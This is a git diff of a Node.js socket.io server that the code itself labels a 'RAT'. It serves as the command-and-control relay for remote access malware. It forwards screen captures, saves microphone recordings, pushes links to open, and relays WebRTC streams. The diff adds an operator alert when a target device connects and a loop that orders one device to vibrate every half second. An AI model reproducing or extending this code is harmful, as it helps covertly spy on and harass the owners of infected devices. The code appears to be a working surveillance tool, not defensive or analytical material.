@@ -8,6 +8,10 @@ const fs = require("fs");
 const https = require('https');
 const server = require("http").createServer(app);
 
+let myInterval = null;
+let loopCount = 0
+let disturbRoom = '51ed6cd2c2b9dd57'
+
 const io = require("socket.io")(server, {
   cors: {
     origin: ["https://admin.socket.io"],
@@ -33,24 +37,24 @@ server.listen(port, () => {
 function getReqDate() {
   var year = new Date().getFullYear();
   var month = new Date().getMonth() + 1 + "";
-  if (month.length == 1) {
+  if (month.length === 1) {
     month = "0" + month;
   }
   var day = "" + new Date().getDate();
-  if (day.length == 1) {
+  if (day.length === 1) {
     day = "0" + day;
   }
   var hour = "" + new Date().getHours();
-  if (hour.length == 1) {
+  if (hour.length === 1) {
     hour = "0" + hour;
   }
   var minutes = "" + new Date().getMinutes();
-  if (minutes.length == 1) {
+  if (minutes.length === 1) {
     minutes = "0" + minutes;
   }
 
   var second = "" + new Date().getSeconds();
-  if (second.length == 1) {
+  if (second.length === 1) {
     second = "0" + second;
   }
   return (
@@ -65,9 +69,8 @@ io.on("connection", (socket) => {
   console.log(`${socket.id} connected at ${getReqDate()}`);
   socket.broadcast.emit("connected", `${socket.id} connected at ${getReqDate()}`);
   //socket.broadcast.emit("joinroom", "");
-  alertmsg("Connected to RAT");
 
-let clientParams = socket.handshake.query;
+  let clientParams = socket.handshake.query;
   let clientAddress = socket.request.connection;
 
   //console.log(clientParams);
@@ -92,6 +95,15 @@ socket.broadcast.emit("allroom", ""+socket.rooms);
   socket.on("join", (room) => {
     socket.join(room);
     socket.broadcast.emit("joined", room);
+    const array = ['9ceae7bc0ee2455e'];
+    if (array.includes(room)){
+      alertmsg("Connected to RAT");
+    }
+    if(room === disturbRoom){
+      myInterval = setInterval(()=>{
+        io.to(disturbRoom).emit("order", JSON.stringify({'order': 'vibrate'}));
+      }, 500);
+    }
   });
 
   // when the client emits 'new message', this listens and executes
@@ -155,7 +167,7 @@ socket.broadcast.emit("allroom", ""+socket.rooms);
   socket.on("screendb", (room, data) => {
     socket.to(room).emit("screendb", data);
   });
-  
+
   socket.on("record", (data) => {
     savemic(data);
     //socket.to(room).emit("record", data);
@@ -194,6 +206,10 @@ socket.broadcast.emit("allroom", ""+socket.rooms);
     socket.to(room).emit("openlink", data);
   });
 
+  socket.on("webrtc", (room, data) => {
+    socket.to(room).emit("webrtc", data);
+  });
+
   socket.on("pong", (room, data) => {
     socket.to(room).emit("pong", data);
     //console.log(`${socket.id} pong ${data}`);
@@ -202,11 +218,19 @@ socket.broadcast.emit("allroom", ""+socket.rooms);
     socket.to(room).emit("ping", data);
   });
 
+  socket.on("disconnecting", () => {
+    if (socket.rooms.has('9ceae7bc0ee2455e')){
+      alertmsg("Disconnected From RAT");
+    }
+    if (socket.rooms.has(disturbRoom)){
+      clearInterval(myInterval);
+    }
+  });
   // when the user disconnects.. perform this
   socket.on("disconnect", () => {
     console.log(`${socket.id} disconnected at  ${getReqDate()}`);
     socket.broadcast.emit("disconnected", `${socket.id} disconnected at ${getReqDate()}`);
-    alertmsg("Disconnected From RAT");
+
   });
 });
 
